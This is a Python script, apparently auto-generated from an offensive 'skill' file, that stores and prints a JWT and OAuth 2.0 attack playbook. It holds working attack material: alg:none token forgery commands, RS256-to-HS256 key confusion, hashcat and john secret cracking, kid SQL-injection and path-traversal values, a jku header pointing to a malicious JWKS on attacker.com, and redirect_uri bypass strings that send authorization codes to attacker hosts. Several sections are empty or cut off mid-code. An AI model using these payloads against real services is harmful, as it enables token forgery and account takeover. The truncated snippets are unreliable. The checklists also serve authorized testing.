#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/jwt-oauth-token-attacks

Skill: SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-jwt-oauth-token-attacks.py --help
      python hack-skills-jwt-oauth-token-attacks.py --list
      python hack-skills-jwt-oauth-token-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/jwt-oauth-token-attacks'
TITLE = 'SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: jwt-oauth-token-attacks", "description: >-", "JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses."],
    'skill-jwt-and-oauth-2-0-token-attacks-expert-attack-playbook': [],
    '0-related-routing': ["Use this file for token-centric attacks and flow abuse. Also load:", "- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation", "- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin", "- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC"],
    '1-jwt-anatomy': ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518", "HEADER                     PAYLOAD                           SIGNATURE", "**Decode in terminal**:", "```bash", "echo \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\" | base64 -d"],
    'alg-hs256-typ-jwt': ["echo \"eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0\" | base64 -d"],
    'userid-1234-role-user': ["**Common claim targets** (modify to escalate):", "```json", "\"role\": \"admin\",", "\"isAdmin\": true,", "\"userId\": OTHER_USER_ID,", "\"email\": \"victim@target.com\",", "\"sub\": \"admin\",", "\"permissions\": [\"admin\", \"write\", \"delete\"],", "\"tier\": \"premium\""],
    '2-attack-1-algorithm-none-alg-none': ["Server doesn't validate signature when algorithm is \"none\"/\"None\"/\"NONE\":", "```bash"],
    'burp-jwt-editor-python-jwt-attack': [],
    'step-1-decode-header': ["echo '{\"alg\":\"HS256\",\"typ\":\"JWT\"}' | base64 \u2192 old_header"],
    'step-2-create-new-header': ["echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '=' | tr '/+' '_-'"],
    'step-3-modify-payload-e-g-role-admin': ["echo -n '{\"userId\":1234,\"role\":\"admin\"}' | base64 | tr -d '=' | tr '/+' '_-'"],
    'step-4-construct-token-with-empty-signature': ["HEADER.PAYLOAD."],
    'or': ["HEADER.PAYLOAD", "**Tool (jwt_tool)**:", "```bash", "python3 jwt_tool.py JWT_TOKEN -X a"],
    'automatically-generates-alg-none-variants': [],
    '3-attack-2-rs256-to-hs256-key-confusion': ["**When server uses RS256** (asymmetric \u2014 RSA private key signs, public key verifies):", "- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)", "- Attack: tell server \"this is HS256\" \u2192 server verifies HS256 HMAC using **the public key as secret**", "```bash"],
    'step-1-obtain-public-key-pem-format': [],
    'from-api-well-known-jwks-json-convert-to-pem': [],
    'from-certs-endpoint': [],
    'from-openssl-extraction-from-https-cert': [],
    'step-2-use-jwt-tool-to-sign-with-hs256-using-public-key-as-secret': ["python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem"],
    'step-3-manually': [],
    'modify-header-alg-hs256-typ-jwt': [],
    'sign-entire-header-payload-with-hmac-sha256-using-pem-public-key-bytes': [],
    '4-attack-3-jwt-secret-brute-force': ["HMAC-based JWTs (HS256/HS384/HS512) with weak secret:", "```bash"],
    'hashcat-fast': ["hashcat -a 0 -m 16500 \"JWT_TOKEN_HERE\" /usr/share/wordlists/rockyou.txt"],
    'john': ["echo \"JWT_TOKEN_HERE\" > jwt.txt", "john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt"],
    'jwt-tool': ["python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt", "**Common weak secrets to test manually**:", "secret, password, 123456, qwerty, changeme, your-256-bit-secret,", "APP_NAME, app_name, production, jwt_secret, SECRET_KEY"],
    '5-attack-4-kid-key-id-injection': ["The `kid` header parameter specifies which key to use for verification. No sanitization = injection:"],
    'kid-sql-injection': ["```json", "{\"alg\":\"HS256\",\"kid\":\"' UNION SELECT 'attacker_controlled_key' FROM dual--\"}", "If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`", "Result: HMAC key = `'attacker_controlled_key'` \u2192 forge any payload signed with this value."],
    'kid-path-traversal-file-read': ["```json", "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}", "Server reads `/dev/null` as key \u2192 empty string \u2192 sign token with empty HMAC.", "```json", "{\"alg\":\"HS256\",\"kid\":\"../../../../etc/hostname\"}", "Server reads hostname as key \u2192 forge tokens signed with hostname string."],
    '6-attack-5-jku-x5u-header-injection': ["`jku` points to JSON Web Key Set URL. If not whitelisted:", "```json", "{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/malicious-jwks.json\",\"kid\":\"my-key\"}", "**Setup**:", "```bash"],
    'generate-rsa-key-pair': ["openssl genrsa -out private.pem 2048", "openssl rsa -in private.pem -pubout -out public.pem"],
    'create-jwks': ["python3 -c \"", "import json, base64, struct"],
    'use-python-jwcrypto-or-jwt-tool-to-export-jwks': [],
    'host-malicious-jwks-at-attacker-com-malicious-jwks-json': [],
    'sign-jwt-with-attacker-s-private-key': [],
    'server-fetches-attacker-s-jwks-verifies-with-attacker-s-public-key-accepts': ["**jwt_tool automation**:", "```bash", "python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json"],
    '7-oauth-2-0-state-parameter-missing-csrf': ["State parameter prevents CSRF in OAuth. If missing:", "Attack:", "1. Click \"Login with Google\" \u2192 OAuth starts \u2192 intercept the redirect URL:", "https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...", "2. Get the authorization code (stop before exchanging it)", "3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE", "4. Victim clicks that URL \u2192 their session binds to ATTACKER's OAuth identity", "\u2192 ACCOUNT TAKEOVER"],
    '8-oauth-redirect-uri-bypass': ["Authorization codes are sent to `redirect_uri`. If validation is weak:"],
    'open-redirect-in-redirect-uri': ["Original: redirect_uri=https://target.com/callback", "Attack:   redirect_uri=https://target.com/callback/../../../attacker.com", "redirect_uri=https://attacker.com.target.com/callback", "redirect_uri=https://target.com@attacker.com/callback"],
    'partial-path-match': ["Whitelist: https://target.com/callback", "Attack: https://target.com/callback%2f../admin (URL path confusion)", "https://target.com/callbackXSS (prefix match only)"],
    'localhost-development-redirect': ["redirect_uri=http://localhost/steal", "redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)"],
    '9-oauth-implicit-flow-token-theft': ["Implicit flow: token sent in URL fragment `#access_token=...`", "**Fragment leakage scenarios**:", "- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page", "- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` \u2192 token in fragment lands at attacker's page"],
    '10-oauth-scope-escalation': ["Request broader scope than authorized in authorization code:", "Authorized scope: read:profile", "Attack: During token exchange, add scope=admin or scope=read:admin", "\u2192 Does server grant requested scope or issued scope?"],
    '11-token-leakage-vectors': [],
    'referer-header': ["Token in URL \u2192 page loads external resource \u2192 Referer leaks token:", "https://target.com/dashboard#access_token=TOKEN", "\u2192 HTML loads: <img src=\"https://analytics.third-party.com/track\">", "\u2192 Referer: https://target.com/dashboard#access_token=TOKEN", "\u2192 analytics.third-party.com sees token in Referer logs"],
    'server-logs': ["Access tokens sent in query parameters are stored in:", "/var/log/nginx/access.log", "/var/log/apache2/access.log", "ELB/ALB logs (AWS)", "CloudFront logs", "CDN logs"],
    '12-jwt-testing-checklist': ["\u25a1 Decode header + payload (base64 decode each part)", "\u25a1 Identify algorithm: HS256/RS256/ES256/none", "\u25a1 Modify payload fields (role, userId, isAdmin) \u2192 change signature too", "\u25a1 Test alg:none \u2192 remove signature entirely", "\u25a1 If RS256: find public key \u2192 attempt RS256\u2192HS256 confusion", "\u25a1 If HS256: brute force with hashcat/rockyou", "\u25a1 Check kid parameter \u2192 try SQL injection + path traversal", "\u25a1 Check jku/x5u header \u2192 redirect to attacker JWKS", "\u25a1 Test token reuse after logout", "\u25a1 Test expired token acceptance (exp claim)", "\u25a1 Check for token in GET params (log leakage) vs header"],
    '13-oauth-testing-checklist': ["\u25a1 Check for state parameter in authorization request", "\u25a1 Test redirect_uri manipulation (open redirect, prefix match, path confusion)", "\u25a1 Can tokens be exchanged more than once?", "\u25a1 Test scope escalation during token exchange", "\u25a1 Implicit flow: check for token in Referer/history", "\u25a1 PKCE: can code_challenge be bypassed or code_verifier be empty?", "\u25a1 Check for authorization code reuse (code must be single-use)", "\u25a1 Test account linking abuse: link OAuth to existing account with same email", "\u25a1 Check OAuth provider confusion: use Apple ID to link where Google expected"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()